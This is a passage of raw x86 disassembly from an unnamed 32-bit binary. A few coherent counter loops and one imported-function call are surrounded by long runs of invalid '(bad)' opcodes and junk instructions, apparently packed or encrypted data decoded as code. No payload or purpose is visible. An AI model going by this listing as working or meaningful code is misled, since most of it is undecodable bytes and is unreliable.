  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x4336ef
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x4336ef,ecx
  40acf7:	cmp    DWORD PTR ds:0x4336ef,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43369f,0xf8d
  40ad0e:	jmp    0x40af71
  40ad13:	stos   DWORD PTR es:[edi],eax
  40ad14:	adc    eax,0x70b1f693
  40ad19:	imul   edx,DWORD PTR [ecx+0x53],0x49
  40ad1d:	adc    BYTE PTR [esi-0x41e42e18],bh
  40ad23:	call   0x7e7c:0x387e7ee9
  40ad2a:	jle    0x40aceb
  40ad2c:	jge    0x40acc2
  40ad2e:	jmp    0xaa051ee2
  40ad33:	retf   
  40ad34:	pusha  
  40ad35:	cdq    
  40ad36:	aad    0xa3
  40ad38:	pop    eax
  40ad39:	xor    cl,BYTE PTR [esi-0x37]
  40ad3c:	es inc eax
  40ad3e:	mov    ebp,0xb0ee8267
  40ad43:	in     eax,0x49
  40ad45:	(bad)  
  40ad46:	mov    eax,ds:0xb47166e8
  40ad4b:	lods   eax,DWORD PTR ds:[esi]
  40ad4c:	or     al,0xa4
  40ad4e:	das    
  40ad4f:	(bad)  
  40ad51:	mov    dl,0x9b
  40ad53:	aas    
  40ad54:	lods   eax,DWORD PTR ds:[esi]
  40ad55:	in     eax,dx
  40ad56:	mov    ecx,0x216f52d3
  40ad5b:	out    0xfb,eax
  40ad5d:	popf   
  40ad5e:	xor    edi,DWORD PTR [ebp-0x69]
  40ad61:	cmp    al,ah
  40ad63:	in     eax,dx
  40ad64:	sti    
  40ad65:	shl    DWORD PTR [eax+0x6f],1
  40ad68:	add    eax,0x83cc1042
  40ad6d:	ret    0xabcc
  40ad70:	mov    eax,0xd87a7539
  40ad75:	scas   eax,DWORD PTR es:[edi]
  40ad76:	sbb    ecx,DWORD PTR [esi+0xb]
  40ad79:	mov    ch,ah
  40ad7b:	es xchg esi,eax
  40ad7d:	inc    eax
  40ad7e:	inc    ebp
  40ad7f:	jmp    0x1f4d:0x65e669c7
  40ad86:	(bad)  
  40ad87:	(bad)  
  40ad88:	neg    DWORD PTR [ebx+0x638c534b]
  40ad8e:	pop    es
  40ad8f:	push   ss
  40ad90:	cdq    
  40ad91:	out    0x86,eax
  40ad93:	mov    esi,0xcc5d7393
  40ad98:	mov    al,0xa9
  40ad9a:	sbb    DWORD PTR [edi+0x3b],ebp
  40ad9d:	cmp    al,BYTE PTR [ebx+0x29]
  40ada0:	mov    ah,0xf1
  40ada2:	(bad)  
  40ada3:	lds    esi,FWORD PTR [edx-0x33327851]
  40ada9:	hlt    
  40adaa:	fcomp  QWORD PTR ds:0x7dddbccd
  40adb0:	pop    ebp
  40adb1:	cli    
  40adb2:	hlt    
  40adb3:	ss pop edx
  40adb5:	sub    eax,0xbf6653e8
  40adba:	jg     0x40ad8b
  40adbc:	dec    ebx
  40adbd:	and    bl,BYTE PTR [ebp+0x7604e6f2]
  40adc3:	repz adc BYTE PTR [ecx],ah
  40adc6:	lods   al,BYTE PTR ds:[esi]
  40adc7:	(bad)  [eax+ebp*4-0xf494a4f]
  40adce:	pop    ecx
  40adcf:	out    0x39,al
  40add1:	out    0xc2,eax
  40add3:	gs stos DWORD PTR es:[edi],eax
  40add5:	add    al,0xc6
  40add7:	adc    ah,BYTE PTR [edi+ebx*2-0x65876dcb]
  40adde:	add    al,BYTE PTR [eax-0xf]
  40ade1:	rcl    esp,cl
  40ade3:	out    dx,eax
  40ade4:	outs   dx,BYTE PTR ds:[esi]
  40ade5:	jmp    0x36dc:0xa4760c3e
  40adec:	pop    eax
  40aded:	cmp    edx,0xffffffe2
  40adf0:	push   edi
  40adf1:	add    esi,DWORD PTR [esi+0x1b55305a]
  40adf7:	pop    esi
  40adf8:	fs xor eax,0x4c9f04ca
  40adfe:	shl    DWORD PTR [edi],cl
  40ae00:	fld    st(1)
  40ae02:	(bad)  
  40ae03:	fisubr DWORD PTR [edi+0x79]
  40ae06:	mov    bh,0x94
  40ae08:	rcl    BYTE PTR [edx-0x64],0x8d
  40ae0c:	lods   eax,DWORD PTR ds:[esi]
  40ae0d:	fsub   DWORD PTR [eax]
  40ae0f:	dec    ebx
  40ae10:	inc    edi
  40ae11:	sub    eax,DWORD PTR [edi+eax*1-0x78528e8c]
  40ae18:	ret    
  40ae19:	mov    esi,0xd65e28a6
  40ae1e:	das    
  40ae1f:	push   ebx
  40ae20:	cmp    al,0xc5
  40ae22:	repz mov es:0xb01f07e0,al
  40ae29:	sbb    dl,BYTE PTR [ebx+edx*1-0x2e1f0db1]
  40ae30:	lea    edx,[edi]
  40ae32:	xor    BYTE PTR [edi],al
  40ae34:	in     eax,0x44
  40ae36:	repnz into 
  40ae38:	xor    al,0x8d
  40ae3a:	(bad)  
  40ae3b:	dec    edx
  40ae3c:	or     bh,dl
  40ae3e:	dec    ebp
  40ae3f:	lds    ecx,FWORD PTR [ecx+eax*1-0x6b]
  40ae43:	sar    BYTE PTR [ebx],1
  40ae45:	sub    DWORD PTR [eax],0xcf11170d
  40ae4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae4c:	ins    BYTE PTR es:[edi],dx
  40ae4d:	shr    BYTE PTR [edi],1
  40ae4f:	pop    edx
  40ae50:	ins    BYTE PTR es:[edi],dx
  40ae51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae52:	cmp    eax,0x2436b56a
  40ae57:	inc    edx
  40ae58:	inc    esp
  40ae59:	mov    cl,0x61
  40ae5b:	inc    edi
  40ae5c:	idiv   bh
  40ae5e:	mov    ah,0x47
  40ae60:	adc    edx,DWORD PTR [eax-0x43]
  40ae63:	adc    DWORD PTR [ecx],0x4b40772d
  40ae69:	mov    DWORD PTR [ecx-0x2e],eax
  40ae6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae6d:	xchg   ecx,eax
  40ae6e:	jg     0x40aed5
  40ae70:	jno    0x40aeb8
  40ae72:	push   ebp
  40ae73:	cmp    eax,0x8cd534e6
  40ae78:	xor    al,0x3f
  40ae7a:	pop    es
  40ae7b:	shr    BYTE PTR [esp+edx*4-0x2b9a5c02],cl
  40ae82:	repz jmp 0xdee3:0x87417a5d
  40ae8a:	sbb    edi,DWORD PTR [esi-0x6b]
  40ae8d:	dec    esi
  40ae8e:	push   0xe6156d7d
  40ae93:	mov    al,0xe1
  40ae95:	sub    al,0x5e
  40ae97:	jecxz  0x40aec5
  40ae99:	add    BYTE PTR ds:0x89886bd1,dh
  40ae9f:	aas    
  40aea0:	in     eax,dx
  40aea1:	inc    esp
  40aea2:	jbe    0x40aeae
  40aea4:	ret    0x1f53
  40aea7:	ret    
  40aea8:	shr    BYTE PTR fs:[eax],1
  40aeab:	xchg   DWORD PTR [edx+0x5d020816],esi
  40aeb1:	push   edi
  40aeb2:	cli    
  40aeb3:	cmp    al,0xcc
  40aeb5:	lods   al,BYTE PTR ds:[esi]
  40aeb6:	sub    al,0x16
  40aeb8:	rcl    ecx,cl
  40aeba:	mov    eax,0x18ab4121
  40aebf:	xlat   BYTE PTR ds:[ebx]
  40aec0:	jmp    0xdf13f22e
  40aec5:	hlt    
  40aec6:	sbb    BYTE PTR [edx+eiz*1+0x7dc7f8e7],ch
  40aecd:	int    0xbf
  40aecf:	pushf  
  40aed0:	shl    edi,0x6
  40aed3:	mov    gs,WORD PTR [ebp+0x3a]
  40aed6:	sbb    eax,0xa11efd27
  40aedb:	shr    ebp,1
  40aedd:	push   edx
  40aede:	xor    eax,0x5162c194
  40aee3:	push   es
  40aee4:	(bad)  [edx+eiz*1-0xf]
  40aee8:	icebp  
  40aee9:	loopne 0x40ae8a
  40aeeb:	pop    es
  40aeec:	mov    dh,0xe5
  40aeee:	imul   eax,DWORD PTR [esp+ebp*1],0x4c
  40aef2:	inc    edi
  40aef3:	inc    edi
  40aef4:	inc    eax
  40aef5:	(bad)  
  40aef6:	mov    WORD PTR [ebx],?
  40aef8:	enter  0x5ab,0x24
  40aefc:	cli    
  40aefd:	xchg   esi,eax
  40aefe:	nop
  40aeff:	pop    edi
  40af00:	jo     0x40af56
  40af02:	xchg   edx,eax
  40af03:	stos   DWORD PTR es:[edi],eax
  40af04:	ret    
  40af05:	aad    0x3f
  40af07:	lea    edi,[edx]
  40af09:	(bad)  
  40af0a:	pop    esp
  40af0b:	sbb    al,0x57
  40af0d:	sub    BYTE PTR [edi-0x4136a51a],0xbb
  40af14:	aas    
  40af15:	or     BYTE PTR [ecx],al
  40af17:	loopne 0x40aeeb
  40af19:	mul    esp
  40af1b:	xor    DWORD PTR [edx-0x62],ecx
  40af1e:	pushf  
  40af1f:	mov    eax,ds:0x40b36e19
  40af24:	mov    ds:0xe3392fb,al
  40af29:	fidiv  DWORD PTR [edi]
  40af2b:	or     ch,BYTE PTR [edi]
  40af2d:	daa    
  40af2e:	shl    BYTE PTR [edi-0x77],1
  40af31:	loopne 0x40aee1
  40af33:	sub    eax,0x4dffd9cc
  40af38:	cs jecxz 0x40af52
  40af3b:	jno    0x40af9c
  40af3d:	mov    bl,ah
  40af3f:	or     dl,BYTE PTR [edx+0x6e]
  40af42:	xor    cl,BYTE PTR [ebp+0x6def88f7]
  40af48:	retf   
  40af49:	xchg   edx,eax
  40af4a:	adc    DWORD PTR [ebx],esp
  40af4c:	imul   ecx,DWORD PTR [edx-0x1d87626c],0xfd43b2da
  40af56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af57:	pop    esp
  40af58:	jnp    0x40aefc
  40af5a:	sbb    BYTE PTR [edi-0x65],cl
  40af5d:	inc    edx
  40af5e:	inc    esi
  40af5f:	mov    esi,0x7f2aba44
  40af64:	pop    eax
  40af65:	adc    al,0xc2
  40af67:	inc    edx
  40af68:	fwait
  40af69:	cmp    eax,0x6d114d24
  40af6e:	push   ds
  40af6f:	cmp    DWORD PTR [ecx-0x75],edx
  40af72:	inc    eax
  40af73:	sbb    BYTE PTR [ecx+0x7018c9],al
  40af79:	add    BYTE PTR [ecx+0x458be045],cl
  40af7f:	in     al,dx
  40af80:	mov    ecx,DWORD PTR [ebp+0x8]
  40af83:	not    DWORD PTR ds:0x4336a7
  40af89:	add    ecx,DWORD PTR [eax+0x20]
  40af8c:	movzx  eax,BYTE PTR ds:0x43365f
  40af93:	sub    DWORD PTR ds:0x43360f,eax
  40af99:	mov    DWORD PTR [ebp-0x28],ecx
  40af9c:	and    DWORD PTR ds:0x43365b,0x0
  40afa6:	jmp    0x40afb8
  40afab:	mov    ecx,DWORD PTR ds:0x43365b
  40afb1:	inc    ecx
  40afb2:	mov    DWORD PTR ds:0x43365b,ecx
  40afb8:	cmp    DWORD PTR ds:0x43365b,0x1f
  40afbf:	jae    0x40b269
  40afc5:	cmp    DWORD PTR ds:0x43365b,0xb
  40afcc:	jne    0x40afdd
  40afd2:	push   0x140a
  40afd7:	call   DWORD PTR ds:0x41235c
  40afdd:	cmp    DWORD PTR ds:0x43365b,0xa
  40afe4:	jne    0x40aff7
  40afea:	mov    ecx,DWORD PTR ds:0x43365b
  40aff0:	inc    ecx
  40aff1:	mov    DWORD PTR ds:0x43365b,ecx
  40aff7:	jmp    0x40afab
  40affc:	xor    DWORD PTR ds:0x4336a7,0xf10
  40b006:	jmp    0x40b269
  40b00b:	push   ecx
  40b00c:	fsubr  DWORD PTR [eax+0x5171b121]
  40b012:	push   0xf81790a
  40b017:	and    cl,BYTE PTR [ebp+0x36]
  40b01a:	push   edx
  40b01b:	idiv   DWORD PTR fs:[esi+0x7e]
  40b01f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b023:	in     al,0x10
  40b025:	jecxz  0x40afb9
  40b027:	add    edx,DWORD PTR [eax+ebp*8+0x37]
  40b02b:	xchg   esp,eax
  40b02c:	cwde   
  40b02d:	or     BYTE PTR ds:0x91697649,al
  40b033:	jmp    0x40b04f
  40b035:	mov    edi,0xa1a2bf1
  40b03a:	int3   
  40b03b:	fmulp  st(0),st
  40b03d:	dec    esp
  40b03e:	cmc    
  40b03f:	bound  esp,QWORD PTR [edx+0x3abe7793]
  40b045:	(bad)  
  40b046:	fxch   st(3)
  40b048:	push   ss
  40b049:	lods   al,BYTE PTR ds:[esi]
  40b04a:	add    esi,esp
  40b04c:	pop    ebp
  40b04d:	aaa    
  40b04e:	fmul   QWORD PTR [edx]
  40b050:	pop    ebp
  40b051:	or     BYTE PTR [edi+0x10],al
  40b054:	mov    BYTE PTR [edx],bl
  40b056:	fsub   st,st(4)
  40b058:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b059:	xchg   esi,eax
  40b05a:	stc    
  40b05b:	xchg   ecx,eax
  40b05c:	daa    
  40b05d:	jne    0x40b09a
  40b05f:	in     eax,dx
  40b060:	sub    al,0xd7
  40b062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b063:	repnz mov al,ds:0xd0a5cdf2
  40b069:	mov    ch,0xd3
  40b06b:	jg     0x40b0b7
  40b06d:	jmp    0x9435:0xb684c377
  40b074:	sti    
  40b075:	push   ecx
  40b076:	lahf   
  40b077:	mov    esi,0x8725067b
  40b07c:	shr    edx,0xbb
  40b07f:	in     al,0xd1
  40b081:	mov    ebp,DWORD PTR [edx+0x25]
  40b084:	daa    
  40b085:	sbb    ch,dh
  40b087:	aas    
  40b088:	inc    edi
  40b089:	(bad)  
  40b08a:	lahf   
  40b08b:	jnp    0x40b0d6
  40b08d:	mov    edi,0x37115bc9
  40b092:	repz cmp DWORD PTR [ecx],esi
  40b095:	inc    edx
  40b096:	mov    dh,0x5b
  40b098:	jp     0x40b02f
  40b09a:	rcl    ebp,1
  40b09c:	adc    DWORD PTR [esi-0x6c9bf3ef],0x14
  40b0a3:	lods   eax,DWORD PTR ds:[esi]
  40b0a4:	aas    
  40b0a5:	adc    ebp,edi
  40b0a7:	daa    
  40b0a8:	shl    ebx,0xed
  40b0ab:	sub    DWORD PTR [ebp+0x7ada04bb],0x79
  40b0b2:	scas   eax,DWORD PTR es:[edi]
  40b0b3:	xor    al,0xd0
  40b0b5:	dec    ebp
  40b0b6:	ins    DWORD PTR es:[edi],dx
  40b0b7:	sbb    DWORD PTR [esi],ebp
  40b0b9:	loope  0x40b079
  40b0bb:	mov    al,ds:0xfad8ac84
  40b0c0:	add    ch,al
  40b0c2:	jns    0x40b0f9
  40b0c4:	imul   ebp,ebx,0xfb0a43ac
  40b0ca:	xor    cl,ah
  40b0cc:	div    BYTE PTR [ecx+esi*1]
  40b0cf:	enter  0x1854,0x99
  40b0d3:	push   cs
  40b0d4:	or     eax,0xccbe8d66
  40b0d9:	push   0x4be9609e
  40b0de:	add    al,0x67
  40b0e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0e1:	mov    ecx,0xaf20bc0e
  40b0e6:	xor    al,0x2f
  40b0e8:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0ea:	scas   al,BYTE PTR es:[edi]
  40b0eb:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0ed:	arpl   WORD PTR [edx+0x42],bp
  40b0f0:	jmp    0x40b0e9
  40b0f2:	imul   ebx,DWORD PTR [edx],0xb372fc6
  40b0f8:	shl    edx,0xb
  40b0fb:	or     eax,0xe22f832
  40b100:	mov    ebx,0x68899035
  40b105:	ss jp  0x40b165
  40b108:	psrlw  mm0,QWORD PTR [ebp+0xeb820c2]
  40b10f:	pop    ecx
  40b110:	mov    ch,0xe6
  40b112:	mov    dl,0xa0
  40b114:	arpl   WORD PTR [ecx+ecx*8+0x241f46de],di
  40b11b:	cmp    BYTE PTR [ebp+0x31],ah
  40b11e:	mov    bl,0xe4
  40b120:	test   al,0x5b
  40b122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b123:	sbb    DWORD PTR [esp+0x56],edi
  40b127:	test   eax,0x127d6d86
  40b12c:	cwde   
  40b12d:	popf   
  40b12e:	sahf   
  40b12f:	(bad)  
  40b130:	pop    eax
  40b131:	(bad)  
  40b132:	cdq    
  40b133:	outs   dx,BYTE PTR ds:[esi]
  40b134:	jo     0x40b1ae
  40b136:	cli    
  40b137:	jmp    DWORD PTR [ebx+0x20043d55]
  40b13d:	push   ebx
  40b13e:	mov    dh,BYTE PTR [esi]
  40b140:	jmp    0xcb0be19f
  40b145:	retf   0x5fa
  40b148:	inc    edx
  40b149:	inc    ecx
  40b14a:	mov    eax,DWORD PTR [eax-0x2b4dd87e]
  40b150:	sbb    bl,BYTE PTR [ebx]
  40b152:	push   ebx
  40b153:	push   ss
  40b154:	xchg   edi,eax
  40b155:	stos   DWORD PTR es:[edi],eax
  40b156:	stos   DWORD PTR es:[edi],eax
  40b157:	sbb    DWORD PTR [esi],edx
  40b159:	mov    esp,0x43229bb4
  40b15e:	jnp    0x40b1c5
  40b160:	mov    eax,0x7fa7c07
  40b165:	dec    ebp
  40b166:	fcmove st,st(5)
  40b168:	cmc    
  40b169:	fwait
  40b16a:	pop    ebx
  40b16b:	or     eax,0xaaef4309
  40b170:	mov    ch,0x44
  40b172:	add    edx,DWORD PTR [edx+0x149d4fac]
  40b178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b179:	gs cmp al,0x8c
  40b17c:	aaa    
  40b17d:	mov    cl,0x9d
  40b17f:	jnp    0x40b12e
  40b181:	mov    esp,0x5bae3930
  40b186:	imul   eax,edi
  40b189:	out    dx,al
  40b18a:	xor    BYTE PTR [edx-0x72333c7c],dh
  40b190:	adc    al,0xc0
  40b192:	cmp    al,0xc
  40b194:	rol    DWORD PTR es:[esi],cl
  40b197:	js     0x40b123
  40b199:	jp     0x40b1b8
  40b19b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b19c:	mov    al,0x42
  40b19e:	fistp  WORD PTR [ebp-0x26]
  40b1a1:	das    
  40b1a2:	ins    BYTE PTR es:[edi],dx
  40b1a3:	or     eax,0x77dbef69
  40b1a8:	xor    DWORD PTR [ebx],edx
  40b1aa:	or     DWORD PTR [eax+0x5c],ebp
  40b1ad:	dec    eax
  40b1ae:	in     eax,dx
  40b1af:	iret   
  40b1b0:	mov    ah,0xf0
  40b1b2:	adc    eax,0x15ee6f81
  40b1b7:	pop    ebx
  40b1b8:	mov    cl,0xb3
  40b1ba:	sbb    DWORD PTR [ecx-0x3b],ebx
  40b1bd:	xchg   BYTE PTR [edi+0x2e],bh
  40b1c0:	in     eax,0x3d
  40b1c2:	sbb    ebx,DWORD PTR [ecx]
  40b1c4:	neg    DWORD PTR [edi]
  40b1c6:	aaa    
  40b1c7:	and    al,0xe6
  40b1c9:	dec    esp
  40b1ca:	xlat   BYTE PTR ds:[ebx]
  40b1cb:	sbb    bl,bl
  40b1cd:	mov    ah,0x6b
  40b1cf:	mov    ecx,DWORD PTR [edi]
  40b1d1:	(bad)  
  40b1d3:	xlat   BYTE PTR ds:[ebx]
  40b1d4:	jbe    0x40b165
  40b1d6:	(bad)  
  40b1d8:	xchg   edi,eax
  40b1d9:	lahf   
  40b1da:	inc    edi
  40b1db:	in     al,0x4
  40b1dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1de:	scas   eax,DWORD PTR es:[edi]
  40b1df:	or     eax,0x2c79ccd7
  40b1e4:	(bad)  
  40b1e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b1e6:	push   esi
  40b1e7:	neg    ah
  40b1e9:	mov    ch,0x28
  40b1eb:	mov    al,ds:0x50598503
  40b1f0:	jge    0x40b1e6
  40b1f2:	jl     0x40b1e0
  40b1f4:	iret   
  40b1f5:	push   edx
  40b1f6:	stos   DWORD PTR es:[edi],eax
  40b1f7:	lock fmul DWORD PTR [edi-0x64]
  40b1fb:	stos   DWORD PTR es:[edi],eax
  40b1fc:	add    eax,0x987ca816
  40b201:	retf   
  40b202:	mov    ah,BYTE PTR [ebx-0x2cf2f97d]
  40b208:	(bad)  
  40b209:	adc    ah,BYTE PTR [ecx-0xb]
  40b20c:	xchg   ebp,eax
  40b20d:	test   ebx,ebx
  40b20f:	or     ebp,esp
  40b211:	dec    eax
  40b212:	and    BYTE PTR [edi+edi*8],dh
  40b215:	jns    0x40b1da
  40b217:	ret    0x5e9d
  40b21a:	push   ebx
  40b21b:	jne    0x40b25c
  40b21d:	cmp    ebx,esp
  40b21f:	jle    0x40b280
  40b221:	and    al,0xc5
  40b223:	das    
  40b224:	mov    bh,0xd
  40b226:	pop    ss
  40b227:	push   cs
  40b228:	push   ebx
  40b229:	sbb    BYTE PTR [ecx+0xc18cbfc],dh
  40b22f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b230:	adc    BYTE PTR [ebp-0x1ff2a37b],bh
  40b236:	mov    dh,0x55
  40b238:	push   edi
  40b239:	jnp    0x40b20d
  40b23b:	neg    DWORD PTR [edx+0x7b163610]
  40b241:	add    eax,0x6e3bb9f4
  40b246:	stos   BYTE PTR es:[edi],al
  40b247:	jl     0x40b1d1
  40b249:	(bad)  
  40b24a:	into   
  40b24b:	push   0x7e
  40b24d:	out    dx,al
  40b24e:	mov    al,0x98
  40b250:	test   BYTE PTR [edi+0x7c],ch
  40b253:	mov    eax,ds:0xab7e6787
  40b258:	mov    ch,bl
  40b25a:	push   ds
  40b25b:	lock mov esi,0xf74a8558
  40b261:	enter  0x1678,0x1d
  40b265:	and    al,0xee
  40b267:	pop    es
  40b268:	sbb    ecx,DWORD PTR [ebx+0x4d8bec45]
  40b26e:	or     BYTE PTR [ebx],al
  40b270:	dec    eax
  40b271:	and    al,0xe9
  40b273:	pop    esi
  40b274:	add    al,BYTE PTR [eax]
  40b276:	add    BYTE PTR [ecx-0x73],dh
  40b279:	push   ebp
  40b27a:	clc    
  40b27b:	jno    0x40b2bd
  40b27d:	jno    0x40b2f4
  40b27f:	pop    esi
  40b280:	repz das 
  40b282:	push   es
  40b283:	outs   dx,DWORD PTR ds:[esi]
  40b284:	push   ds
  40b285:	sub    eax,0x7ef22e3a
  40b28a:	jle    0x40b2c4
  40b28c:	jl     0x40b30c
  40b28e:	jle    0x40b267
  40b290:	adc    ebx,DWORD PTR [esi+0x6633909c]
  40b296:	pop    ebp
  40b297:	test   eax,0x5d8b44d2
  40b29c:	(bad)  
  40b29d:	xlat   BYTE PTR ds:[ebx]
  40b29e:	and    al,0x57
  40b2a0:	fdiv   st,st(3)
  40b2a2:	mov    edx,0x847e5d0c
  40b2a7:	inc    edi
  40b2a8:	xchg   esi,eax
  40b2a9:	lods   al,BYTE PTR ds:[esi]
  40b2aa:	clc    
  40b2ab:	sbb    dl,BYTE PTR [edx]
  40b2ad:	jmp    0x809d6ef2
  40b2b2:	fnstenv [esi-0x48]
  40b2b5:	fs ret 0x1e5f
  40b2b9:	xor    BYTE PTR [edx-0x5b378daf],al
  40b2bf:	push   es
  40b2c0:	push   0xfffffff8
  40b2c2:	(bad)  
  40b2c3:	push   ds
  40b2c4:	or     ch,BYTE PTR [esi]
  40b2c6:	dec    ebp
  40b2c7:	mov    bh,0x0
  40b2c9:	ret    0x20a6
  40b2cc:	dec    edx
  40b2cd:	outs   dx,BYTE PTR ds:[esi]
  40b2ce:	in     al,0x7e
  40b2d0:	inc    ecx
  40b2d1:	sbb    dl,BYTE PTR [esi+ebx*1+0x23]
  40b2d5:	jb     0x40b2c6
  40b2d7:	mov    ds:0xb4bfd2f3,eax
  40b2dc:	jecxz  0x40b2ed
  40b2de:	adc    BYTE PTR [edx-0x43],al
  40b2e1:	sar    eax,1
  40b2e3:	popf   
  40b2e4:	jmp    0x40b2e5
  40b2e6:	push   0x6d
  40b2e8:	xchg   ecx,edx
  40b2ea:	jp     0x40b28b
  40b2ec:	retf   
  40b2ed:	jmp    0x40b2d1
  40b2ef:	mov    eax,0xc18da48d
  40b2f4:	mov    dh,0x47
  40b2f6:	xor    esp,DWORD PTR [ebp-0x1e7b090e]
  40b2fc:	mov    ah,0xff
  40b2fe:	pop    ebp
  40b2ff:	inc    ebx
  40b300:	add    al,0xca
  40b302:	lds    edi,FWORD PTR [edi+eiz*4]
  40b305:	sub    ebx,edi
  40b307:	ror    esi,1
  40b309:	and    dl,BYTE PTR [eax-0x67]
  40b30c:	jns    0x40b2a6
  40b30e:	pop    esi
  40b30f:	push   0x7bff156e
  40b314:	in     eax,0x3b
  40b316:	out    dx,al
  40b317:	xchg   edi,eax
  40b318:	into   
  40b319:	gs or  al,0x43
  40b31c:	jbe    0x40b317
  40b31e:	repnz outs dx,BYTE PTR ds:[esi]
  40b320:	ds jmp 0x40b338
  40b323:	out    0x81,eax
  40b325:	scas   eax,DWORD PTR es:[edi]
  40b326:	lock mov ebx,0x57a9de1f
  40b32c:	stos   DWORD PTR es:[edi],eax
  40b32d:	inc    edx
  40b32e:	(bad)  
  40b32f:	(bad)  
  40b330:	fcomp  DWORD PTR [esp+edx*1+0x26c89397]
  40b337:	sbb    esi,esi
  40b339:	pop    eax
  40b33a:	test   DWORD PTR cs:[ebx+edi*1+0x36],edi
  40b33f:	(bad)  
  40b340:	mov    ds:0x18258243,al
  40b345:	in     al,0xac
  40b347:	inc    esi
  40b348:	jb     0x40b380
  40b34a:	jg     0x40b36c
  40b34c:	retf   
  40b34d:	add    dl,BYTE PTR [esi]
  40b34f:	dec    DWORD PTR ds:0xeeccdb2e
  40b355:	icebp  
  40b356:	out    0xe7,eax
  40b358:	jecxz  0x40b2f8
  40b35a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b35b:	jo     0x40b37a
  40b35d:	aas    
  40b35e:	mov    al,0x12
  40b360:	add    DWORD PTR [ecx-0x2c],0x970a84bd
  40b367:	dec    esi
  40b368:	sub    eax,0x46688cdf
  40b36d:	inc    dh
  40b36f:	sbb    edi,0xffffffbd
  40b372:	aad    0xb2
  40b374:	cmp    DWORD PTR [eax],esp
  40b376:	or     al,0x7a
  40b378:	into   
  40b379:	jmp    0x40b316
  40b37b:	inc    esi
  40b37c:	fild   QWORD PTR [ebp+ecx*1+0x1f]
  40b380:	adc    ebx,DWORD PTR [eax]
  40b382:	inc    ebx
  40b383:	xchg   ecx,eax
  40b384:	cld    
  40b385:	mov    al,ds:0x2f82cedd
  40b38a:	mov    ebp,0xe23605e2
  40b38f:	add    bh,0x4c
  40b392:	(bad)  
  40b393:	mov    cl,0xb9
  40b395:	jns    0x40b37a
  40b397:	adc    ebp,DWORD PTR [eax-0x24]
  40b39a:	inc    ebx
  40b39b:	ds push 0xffffffe8
  40b39e:	mov    ds:0x2c3c39b2,eax
  40b3a3:	sub    BYTE PTR [edi],cl
  40b3a5:	(bad)  
  40b3a6:	(bad)  
  40b3a7:	and    DWORD PTR [esi],ebp
  40b3a9:	sbb    DWORD PTR [ebx],ecx
  40b3ab:	les    edi,FWORD PTR [esi+edi*4+0x4b]
  40b3af:	sbb    al,0x6
  40b3b1:	cmp    DWORD PTR [edx+0x9],edx
  40b3b4:	bound  ebx,QWORD PTR [edx]
  40b3b6:	repz fsubr DWORD PTR [ebx+ecx*8-0x1a]
  40b3bb:	ret    0xd11c
  40b3be:	jo     0x40b3e2
  40b3c0:	imul   edi,DWORD PTR [ecx+ebx*2],0x5cfe67fa
  40b3c7:	xchg   BYTE PTR [edi+0x7797108d],ch
  40b3cd:	mov    bl,0xd9
  40b3cf:	arpl   WORD PTR ds:0x9de954f2,bp
  40b3d5:	dec    edx
  40b3d6:	and    cl,BYTE PTR [ebx-0x5bffa6eb]
  40b3dc:	cwde   
  40b3dd:	imul   si,WORD PTR [eax+0x4d],0x80bc
  40b3e3:	pop    esp
  40b3e4:	sub    eax,0xe4ebc8a3
  40b3e9:	xchg   esi,eax
  40b3ea:	test   eax,0xc5951052
  40b3ef:	xchg   esp,eax
  40b3f0:	push   cs
  40b3f1:	jecxz  0x40b461
  40b3f3:	or     al,0xde
  40b3f5:	out    0x78,al
  40b3f7:	mov    eax,0xfbad8ce1
  40b3fc:	cmp    bl,dl
  40b3fe:	hlt    
  40b3ff:	mov    ds:0x9366a024,eax
  40b404:	stos   BYTE PTR es:[edi],al
  40b405:	cld    
  40b406:	cwde   
  40b407:	adc    al,BYTE PTR [edx-0x3f]
  40b40a:	and    BYTE PTR [edx+esi*2-0x64],al
  40b40e:	adc    DWORD PTR [esi-0xc5a04d4],ebx
  40b414:	sbb    eax,0xfa018594
  40b419:	push   edx
  40b41a:	jle    0x40b39f
  40b41c:	(bad)  
  40b41d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b41e:	cmp    BYTE PTR ds:0x2fc97da0,ah
  40b424:	xchg   esp,eax
  40b425:	mov    edx,0x30d3ea77
  40b42a:	push   ebp
  40b42b:	add    al,0x7
  40b42d:	popa   
  40b42e:	pop    ebx
  40b42f:	in     eax,dx
  40b430:	cwde   
  40b431:	inc    ecx
  40b432:	mov    WORD PTR [edx-0x2682741e],?
  40b438:	jne    0x40b454
  40b43a:	icebp  
  40b43b:	mov    WORD PTR [ecx+0x5e7afb40],es
  40b441:	push   0x6d012334
  40b446:	mov    cl,0x79
  40b448:	stc    
  40b449:	mov    ss,WORD PTR [ebp*1+0x382a2ed7]
  40b450:	adc    eax,0x5cdabd4c
  40b455:	rol    BYTE PTR [ecx-0x15],0xf0
  40b459:	ds enter 0x8bb0,0x4b
  40b45e:	inc    edx
  40b45f:	fimul  WORD PTR [eax+0x77e67944]
  40b465:	loop   0x40b4c3
  40b467:	cmp    esp,DWORD PTR [ebp-0x68f90fca]
  40b46d:	in     al,dx
  40b46e:	fs in  eax,dx
  40b470:	jne    0x40b460
  40b472:	dec    esi
